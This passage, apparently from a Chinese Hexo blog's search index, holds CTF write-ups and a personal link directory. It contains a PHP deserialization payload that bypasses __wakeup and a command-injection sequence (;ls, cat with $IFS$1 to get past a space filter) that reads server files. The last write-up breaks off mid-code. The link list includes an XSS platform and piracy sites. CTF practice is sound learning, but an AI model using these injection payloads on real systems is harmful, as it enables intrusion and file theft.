username";s:5:"admin";s:14:" Name password";s:3:"100";&amp;#125;</span></code></pre><p>为了绕过<code>__wakeup</code>,执行<code>__destruct</code>,将2改成3，原理：变量个数大于原来的</p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">" Name username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">" Name password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>注意这里面有几个空格，把它换成%00，原理：私有变量前需要加个前缀0</p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>最终payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>select<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:14:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"100"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>site</title>
      <link href="2021/03/08/site/"/>
      <url>2021/03/08/site/</url>
      
        <content type="html"><![CDATA[<h1 id="Study-学习"><a href="#Study-学习" class="headerlink" title="Study_学习"></a>Study_学习</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>慕课（MOOC）</td><td><a href="https://www.icourse163.org/">https://www.icourse163.org/</a></td><td></td></tr><tr><td>安界网</td><td><a href="https://www.ajsafe.com/">https://www.ajsafe.com/</a></td><td></td></tr><tr><td>万门大学</td><td><a href="https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1">https://www.wanmen.org/courses/5d9ed3436cb56f1eb915c49e/lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>时宜搜书</td><td><a href="https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1">https://www.shiyisoushu.com//lectures/5d9ed3632dea468b550a4ba1</a></td><td></td></tr><tr><td>oeasy</td><td><a href="http://oeasy.org/">http://oeasy.org/</a></td><td></td></tr><tr><td>epubee电子书</td><td><a href="http://cn.epubee.com/books/">http://cn.epubee.com/books/</a></td><td></td></tr><tr><td>鸠摩搜书</td><td><a href="https://www.jiumodiary.com/">https://www.jiumodiary.com/</a></td><td></td></tr><tr><td>考试酷</td><td><a href="https://www.examcoo.com/index/ku">https://www.examcoo.com/index/ku</a></td><td></td></tr><tr><td>我要自学网</td><td><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></td><td></td></tr><tr><td>春秋</td><td><a href="https://www.ichunqiu.com/">https://www.ichunqiu.com/</a></td><td></td></tr><tr><td>简搜题</td><td><a href="https://www.jiansouti.com/">https://www.jiansouti.com/</a></td><td></td></tr><tr><td>网考网</td><td><a href="https://www.netkao.com/">https://www.netkao.com/</a></td><td></td></tr><tr><td>优学优考网</td><td><a href="http://www.yxykw.com/">http://www.yxykw.com/</a></td><td></td></tr></tbody></table><h1 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>博客园</td><td><a href="https://www.cnblogs.com/">https://www.cnblogs.com/</a></td><td></td></tr><tr><td>GitHub</td><td><a href="https://github.com/">https://github.com/</a></td><td></td></tr><tr><td>菜鸟教程</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr><tr><td>吾爱破解</td><td><a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></td><td></td></tr><tr><td>stackoverflow</td><td><a href="https://stackoverflow.com/">https://stackoverflow.com/</a></td><td></td></tr><tr><td>w3school</td><td><a href="https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></td><td></td></tr><tr><td>C语言</td><td><a href="https://www.dotcpp.com/">https://www.dotcpp.com/</a></td><td></td></tr><tr><td>慕课网</td><td><a href="https://www.imooc.com/">https://www.imooc.com/</a></td><td></td></tr><tr><td>lib4dev</td><td><a href="http://www.lib4dev.in/">http://www.lib4dev.in/</a></td><td></td></tr><tr><td>掘金</td><td><a href="https://juejin.im/">https://juejin.im/</a></td><td></td></tr><tr><td>oschina</td><td><a href="https://www.oschina.net/?refresh">https://www.oschina.net/?refresh</a></td><td></td></tr><tr><td>老白（博客）</td><td><a href="https://oo0.bid/">https://oo0.bid/</a></td><td></td></tr><tr><td>资源素材站</td><td><a href="http://www.fxrcxjq.com/">http://www.fxrcxjq.com/</a></td><td></td></tr><tr><td>资源干货站</td><td><a href="http://xgp123.cn/">http://xgp123.cn/</a></td><td></td></tr><tr><td>MSDN</td><td><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></td><td></td></tr><tr><td>CTF</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/web/introduction-zh/</a></td><td></td></tr><tr><td>CTF wiki</td><td><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a></td><td></td></tr><tr><td>黑吧安全网</td><td><a href="http://hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></td><td></td></tr><tr><td>三叶草</td><td><a href="https://syc-2019--fxxy.repl.co/source/web.html">https://syc-2019--fxxy.repl.co/source/web.html</a></td><td></td></tr><tr><td>Go破解</td><td><a href="https://www.gopojie.net/">https://www.gopojie.net/</a></td><td></td></tr><tr><td>黑马程序员</td><td><a href="http://yun.itheima.com/">http://yun.itheima.com/</a></td><td></td></tr><tr><td>51cto</td><td><a href="https://edu.51cto.com/">https://edu.51cto.com/</a></td><td></td></tr><tr><td>脚本之家</td><td><a href="https://www.jb51.net/">https://www.jb51.net/</a></td><td></td></tr><tr><td>xss平台</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>md5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr></tbody></table><h1 id="图库"><a href="#图库" class="headerlink" title="图库"></a>图库</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>wallhere</td><td><a href="https://wallhere.com/">https://wallhere.com/</a></td><td></td></tr><tr><td>konachan</td><td><a href="https://konachan.net/">https://konachan.net/</a></td><td></td></tr><tr><td>pixivic</td><td><a href="https://pixivic.com/?VNK=1671e864">https://pixivic.com/?VNK=1671e864</a></td><td></td></tr><tr><td>C站</td><td><a href="https://cosz.net/">https://cosz.net/</a></td><td></td></tr><tr><td>彼岸图库</td><td><a href="http://pic.netbian.com/">http://pic.netbian.com/</a></td><td></td></tr><tr><td>图虫</td><td><a href="https://tuchong.com/">https://tuchong.com/</a></td><td></td></tr><tr><td>电脑壁纸</td><td><a href="http://nav.6soluo.com/pic/">http://nav.6soluo.com/pic/</a></td><td></td></tr><tr><td>wallhaven</td><td><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></td><td></td></tr><tr><td>Pixiv</td><td><a href="https://m.pixivic.com/dailyRank?VNK=beec565f">https://m.pixivic.com/dailyRank?VNK=beec565f</a></td><td></td></tr><tr><td>wallpapercave</td><td><a href="https://wallpapercave.com/">https://wallpapercave.com/</a></td><td></td></tr><tr><td>千叶</td><td><a href="http://qianye88.com/">http://qianye88.com/</a></td><td></td></tr><tr><td>极简壁纸</td><td><a href="https://bz.zzzmh.cn/">https://bz.zzzmh.cn/</a></td><td></td></tr><tr><td>ACG</td><td><a href="https://2046xpro.com/">https://2046xpro.com/</a></td><td></td></tr><tr><td>图片</td><td><a href="https://www.mikuclub.org/">https://www.mikuclub.org/</a></td><td></td></tr><tr><td>壁次元</td><td><a href="https://www.biacgn.com/">https://www.biacgn.com/</a></td><td></td></tr><tr><td>大图库</td><td><a href="http://123.meibp.com/">http://123.meibp.com/</a></td><td></td></tr><tr><td>大叔心</td><td><a href="https://www.dashuxin.com/">https://www.dashuxin.com/</a></td><td></td></tr></tbody></table><h1 id="学校（）"><a href="#学校（）" class="headerlink" title="学校（）"></a>学校（）</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>ICC</td><td><a href="http://icc.hep.com.cn/getSystemDepartmentPortal.action">http://icc.hep.com.cn/getSystemDepartmentPortal.action</a></td><td></td></tr><tr><td>学习通（个人）</td><td><a href="http://i.chaoxing.com/">http://i.chaoxing.com/</a></td><td></td></tr><tr><td>学习通</td><td><a href="http://www.xuexi365.com/">http://www.xuexi365.com/</a></td><td></td></tr><tr><td>近代史</td><td><a href="https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html">https://wenku.baidu.com/view/ceab090dae1ffc4ffe4733687e21af45b307fea8.html</a></td><td></td></tr><tr><td>WE learn</td><td><a href="https://course.sflep.com/">https://course.sflep.com/</a></td><td></td></tr><tr><td>智慧树</td><td><a href="https://www.zhihuishu.com/">https://www.zhihuishu.com/</a></td><td></td></tr><tr><td>雨课堂</td><td><a href="https://www.yuketang.cn/web">https://www.yuketang.cn/web</a></td><td></td></tr></tbody></table><h1 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>爱资料在线工具</td><td><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></td><td></td></tr><tr><td>极简插件</td><td><a href="https://chrome.zzzmh.cn/">https://chrome.zzzmh.cn/</a></td><td></td></tr><tr><td>便捷工具</td><td><a href="https://shulijp.com/">https://shulijp.com/</a></td><td></td></tr><tr><td>蓝调</td><td><a href="http://www.lcoc.top/">http://www.lcoc.top/</a></td><td></td></tr><tr><td>短视频解析</td><td><a href="http://jx.xueshi.pro/">http://jx.xueshi.pro/</a></td><td></td></tr><tr><td>精准云工具</td><td><a href="https://jingzhunyun.com/">https://jingzhunyun.com/</a></td><td></td></tr><tr><td>搞定设计</td><td><a href="https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao">https://www.gaoding.com/?hmsr=zhongcao-gd_zh_qyppt-home---qy-bdqd&amp;utm_medium=&amp;utm_source=zhongcao</a></td><td></td></tr><tr><td>一个工具箱</td><td><a href="http://www.atoolbox.net/">http://www.atoolbox.net/</a></td><td></td></tr><tr><td>合集网</td><td><a href="http://www.heji.ltd/">http://www.heji.ltd/</a></td><td></td></tr><tr><td>创造者日报</td><td><a href="https://creatorsdaily.com/">https://creatorsdaily.com/</a></td><td></td></tr><tr><td>在线工具</td><td><a href="https://tool.lu/">https://tool.lu/</a></td><td></td></tr><tr><td>兔二工具箱</td><td><a href="https://www.tool22.com/">https://www.tool22.com/</a></td><td></td></tr></tbody></table><h1 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>优聚集</td><td><a href="https://ujuji.com/">https://ujuji.com/</a></td><td></td></tr><tr><td>KIM</td><td><a href="https://kim.plopco.com/">https://kim.plopco.com/</a></td><td></td></tr><tr><td>今日热榜</td><td><a href="https://tophub.today/c/ent">https://tophub.today/c/ent</a></td><td></td></tr><tr><td>AnyKnew</td><td><a href="https://www.anyknew.com/#/">https://www.anyknew.com/#/</a></td><td></td></tr><tr><td>牛导航</td><td><a href="http://www.ziliao6.com/">http://www.ziliao6.com/</a></td><td></td></tr><tr><td>沃克导航</td><td><a href="http://www.waysto.work/">http://www.waysto.work/</a></td><td></td></tr><tr><td>站长啦网站目录</td><td><a href="http://top.cnzzla.com/">http://top.cnzzla.com/</a></td><td></td></tr><tr><td>AnywhereAnything</td><td><a href="http://lackar.com/aa/">http://lackar.com/aa/</a></td><td></td></tr><tr><td>老司机导航</td><td><a href="http://www.giffox.com/">http://www.giffox.com/</a></td><td></td></tr><tr><td>广告创意文案</td><td><a href="https://www.addog.vip/">https://www.addog.vip/</a></td><td></td></tr><tr><td>产品经理导航</td><td><a href="https://dh.woshipm.com/#section-1">https://dh.woshipm.com/#section-1</a></td><td></td></tr><tr><td>考拉新媒体导航</td><td><a href="https://www.kaolamedia.com/">https://www.kaolamedia.com/</a></td><td></td></tr><tr><td>国外网站大全</td><td><a href="http://www.world68.com/">http://www.world68.com/</a></td><td></td></tr><tr><td>合集网</td><td><a href="https://www.heji.ltd/">https://www.heji.ltd/</a></td><td></td></tr><tr><td>龙轩</td><td><a href="http://ilxdh.com/">http://ilxdh.com/</a></td><td></td></tr><tr><td>小田田</td><td><a href="https://xydh.fun/xiaotiantian">https://xydh.fun/xiaotiantian</a></td><td></td></tr><tr><td>工具达人</td><td><a href="https://dartools.com/">https://dartools.com/</a></td><td></td></tr></tbody></table><h1 id="磁力"><a href="#磁力" class="headerlink" title="磁力"></a>磁力</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>小白种草</td><td><a href="https://wx.gzlpx.com.cn/">https://wx.gzlpx.com.cn/</a></td><td></td></tr><tr><td>超能搜</td><td><a href="http://www.chaonengsou.com/">http://www.chaonengsou.com/</a></td><td></td></tr><tr><td>罗马盘</td><td><a href="https://www.luomapan.com/">https://www.luomapan.com/</a></td><td></td></tr><tr><td>快搜</td><td><a href="https://search.chongbuluo.com/#nyaso">https://search.chongbuluo.com/#nyaso</a></td><td></td></tr><tr><td>酷搜</td><td><a href="https://www.kolsou.com/">https://www.kolsou.com/</a></td><td></td></tr><tr><td>优聚集</td><td><a href="http://hao.ujuji.com/#/">http://hao.ujuji.com/#/</a></td><td></td></tr><tr><td>小昭来啦</td><td><a href="https://www.xiaozhaolaila.com/">https://www.xiaozhaolaila.com/</a></td><td></td></tr><tr><td>小可搜搜</td><td><a href="https://www.xiaokesoso.com/">https://www.xiaokesoso.com/</a></td><td></td></tr><tr><td>大力盘</td><td><a href="https://www.dalipan.com/">https://www.dalipan.com/</a></td><td></td></tr><tr><td>尘心聚搜索</td><td><a href="https://pan.ischenxin.com/">https://pan.ischenxin.com/</a></td><td></td></tr><tr><td>西瓜搜</td><td><a href="http://www.xgsoso.com/">http://www.xgsoso.com/</a></td><td></td></tr><tr><td>蓝奏搜</td><td><a href="https://www.xqxianbao.com/lzys/">https://www.xqxianbao.com/lzys/</a></td><td></td></tr><tr><td>大圣盘</td><td><a href="https://www.dashengpan.com/">https://www.dashengpan.com/</a></td><td></td></tr><tr><td>云盘精灵</td><td><a href="https://www.yunpanjingling.com/">https://www.yunpanjingling.com/</a></td><td></td></tr><tr><td>云铺子</td><td><a href="http://www.yunpz.net/">http://www.yunpz.net/</a></td><td></td></tr><tr><td>呆河马</td><td><a href="http://www.daihema.com/">http://www.daihema.com/</a></td><td></td></tr><tr><td>盘天下</td><td><a href="https://www.pantianxia.com/">https://www.pantianxia.com/</a></td><td></td></tr><tr><td>小白盘</td><td><a href="https://www.xiaobaipan.com/">https://www.xiaobaipan.com/</a></td><td></td></tr><tr><td>易破解</td><td><a href="https://www.ypojie.com/">https://www.ypojie.com/</a></td><td></td></tr><tr><td>去转盘</td><td><a href="https://www.quzhuanpan.com/">https://www.quzhuanpan.com/</a></td><td></td></tr><tr><td>巴士搜索</td><td><a href="http://bashi5.org/">http://bashi5.org/</a></td><td></td></tr><tr><td>yamadie</td><td><a href="https://yamadie.net/">https://yamadie.net/</a></td><td></td></tr><tr><td>ttdva</td><td><a href="http://www.ttdva.com/">http://www.ttdva.com/</a></td><td></td></tr><tr><td>求资源</td><td><a href="https://www.qiuziyuan.net/">https://www.qiuziyuan.net/</a></td><td></td></tr><tr><td>阿萨姆软件</td><td><a href="https://www.sssam.com/">https://www.sssam.com/</a></td><td></td></tr><tr><td>大白软件站</td><td><a href="https://win.o--o.win/">https://win.o--o.win/</a></td><td></td></tr><tr><td>MT</td><td><a href="http://mt.indabai.com/">http://mt.indabai.com/</a></td><td></td></tr><tr><td>无解搜</td><td><a href="http://wujiesou.com/">http://wujiesou.com/</a></td><td></td></tr><tr><td>懒盘</td><td><a href="https://www.lzpan.com/">https://www.lzpan.com/</a></td><td></td></tr></tbody></table><h1 id="专业（企业）"><a href="#专业（企业）" class="headerlink" title="专业（企业）"></a>专业（企业）</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>华为云直播</td><td><a href="https://bbs.huaweicloud.com/webinar">https://bbs.huaweicloud.com/webinar</a></td><td></td></tr><tr><td>360网络安全学院</td><td><a href="https://university.360.cn/">https://university.360.cn/</a></td><td></td></tr><tr><td>华为高校系列</td><td><a href="https://huaweicloud.bugu.mudu.tv/watch/lm06j3em">https://huaweicloud.bugu.mudu.tv/watch/lm06j3em</a></td><td></td></tr><tr><td>阿里云开发社区</td><td><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></td><td></td></tr><tr><td>腾讯云</td><td><a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a></td><td></td></tr><tr><td>腾讯云开发者手册</td><td><a href="https://cloud.tencent.com/developer/devdocs">https://cloud.tencent.com/developer/devdocs</a></td><td></td></tr></tbody></table><h1 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>QQ邮箱</td><td><a href="https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f">https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f</a></td><td></td></tr><tr><td>吾道幻灯片</td><td><a href="https://www.woodo.cn/?f=2388">https://www.woodo.cn/?f=2388</a></td><td></td></tr><tr><td>uzer</td><td><a href="https://uzer.me/">https://uzer.me/</a></td><td></td></tr><tr><td>hippter（PPT）</td><td><a href="http://www.hippter.com/">http://www.hippter.com/</a></td><td></td></tr></tbody></table><h1 id="影视"><a href="#影视" class="headerlink" title="影视"></a>影视</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>片库</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>真不卡电影网</td><td><a href="https://www.zhenbuka.com/">https://www.zhenbuka.com/</a></td><td></td></tr><tr><td>电影雷达</td><td><a href="http://m.dianyingleida.com/">http://m.dianyingleida.com/</a></td><td></td></tr><tr><td>飘花影院</td><td><a href="http://www.phyy1.com/">http://www.phyy1.com/</a></td><td></td></tr><tr><td>学士爱解析</td><td><a href="http://jiexi.xueshi.pro/">http://jiexi.xueshi.pro/</a></td><td></td></tr><tr><td>聚BT</td><td><a href="https://jubt.net/cn/index.html">https://jubt.net/cn/index.html</a></td><td></td></tr><tr><td>动漫</td><td><a href="https://qinmei.video/">https://qinmei.video/</a></td><td></td></tr><tr><td>蛋蛋赞影院</td><td><a href="https://www.dandanzan.com/">https://www.dandanzan.com/</a></td><td></td></tr><tr><td>电影狗</td><td><a href="http://www.dianyinggou.com/linkNav/">http://www.dianyinggou.com/linkNav/</a></td><td></td></tr><tr><td>VIP</td><td><a href="http://vip.sb/">http://vip.sb/</a></td><td></td></tr></tbody></table><h1 id="文库下载"><a href="#文库下载" class="headerlink" title="文库下载"></a>文库下载</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>南瓜文档</td><td><a href="http://www.588230.com/#wenku">http://www.588230.com/#wenku</a></td><td></td></tr><tr><td>北斗百度文库下载</td><td><a href="http://www.bdwenku.com/">http://www.bdwenku.com/</a></td><td></td></tr></tbody></table><h1 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>哔哩哔哩</td><td><a href="https://www.bilibili.com/">https://www.bilibili.com/</a></td><td></td></tr><tr><td>微云</td><td><a href="https://www.weiyun.com/">https://www.weiyun.com/</a></td><td></td></tr><tr><td>百度云</td><td><a href="https://pan.baidu.com/">https://pan.baidu.com</a></td><td></td></tr><tr><td>蓝奏云</td><td><a href="https://lanzou.com/">https://lanzou.com/</a></td><td></td></tr><tr><td>知乎</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>虎牙</td><td><a href="https://www.huya.com/">https://www.huya.com/</a></td><td></td></tr></tbody></table><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>路过图床</td><td><a href="https://imgchr.com/">https://imgchr.com/</a></td><td></td></tr><tr><td>聚合图床</td><td><a href="https://www.superbed.cn/">https://www.superbed.cn/</a></td><td></td></tr><tr><td>油猴</td><td><a href="https://greasyfork.org/zh-CN">https://greasyfork.org/zh-CN</a></td><td></td></tr><tr><td>插件</td><td><a href="https://www.extfans.com/">https://www.extfans.com/</a></td><td></td></tr><tr><td>云短信</td><td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td><td></td></tr><tr><td>临时邮箱</td><td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td><td></td></tr><tr><td>云短信2</td><td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td><td></td></tr><tr><td>PDF转</td><td><a href="https://www.cleverpdf.com/cn">https://www.cleverpdf.com/cn</a></td><td></td></tr><tr><td>PDF</td><td><a href="https://lightpdf.cn/">https://lightpdf.cn/</a></td><td></td></tr><tr><td>alltoall</td><td><a href="https://www.alltoall.net/">https://www.alltoall.net/</a></td><td></td></tr></tbody></table><h1 id="靶场-渗透"><a href="#靶场-渗透" class="headerlink" title="靶场  渗透"></a>靶场  渗透</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>i春秋</td><td><a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></td><td></td></tr><tr><td>攻防世界</td><td><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></td><td></td></tr><tr><td>Wechall</td><td><a href="http://www.wechall.net/">http://www.wechall.net/</a></td><td></td></tr><tr><td>Wargame</td><td><a href="http://www.wargame.kr/">http://www.wargame.kr/</a></td><td></td></tr><tr><td>渗透师</td><td><a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></td><td></td></tr><tr><td>小迪渗透</td><td><a href="http://www.xiaodi8.com/">http://www.xiaodi8.com/</a></td><td></td></tr><tr><td>MD5</td><td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td><td></td></tr><tr><td>XSS平台</td><td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td><td></td></tr><tr><td>sourceforge</td><td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td><td></td></tr><tr><td>查IP</td><td><a href="https://site.ip138.com/raw.githubusercontent.com/">https://site.ip138.com/raw.githubusercontent.com/</a></td><td></td></tr><tr><td>BUUCTF</td><td><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr><tr><td>Bugku</td><td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr></tbody></table><h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>片库</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>知乎</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>菜鸟</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link href="2021/03/01/gxyctf2019-ping-ping-ping/"/>
      <url>2021/03/01/gxyctf2019-ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进去关键字是IP,get传参 ip=127.0.0.1</p><pre class=" language-php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes</code></pre><p>读取目录下文件</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>ls<span class="token constant">PING</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token punctuation">.</span>phpindex<span class="token punctuation">.</span>php</code></pre><p>尝试读取flag.php</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>cat<span class="token operator">%</span>20flag<span class="token punctuation">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your space<span class="token operator">!</span><span class="token comment" spellcheck="true">//空格被ban</span></code></pre><p>绕过空格</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>cat<span class="token variable">$IFS</span><span class="token variable">$1flag</span><span class="token punctuation">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your flag<span class="token operator">!</span><span class="token comment" spellcheck="true">//flag被ban</span></code></pre><p>读取index.php</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>cat<span class="token variable">$IFS</span><span class="token variable">$1index</span><span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string">"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&amp;|\/|\?|\*|\&lt;|[\x&amp;#123;00&amp;#125;-\x&amp;#123;20&amp;#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your symbol!"</span><span class="token 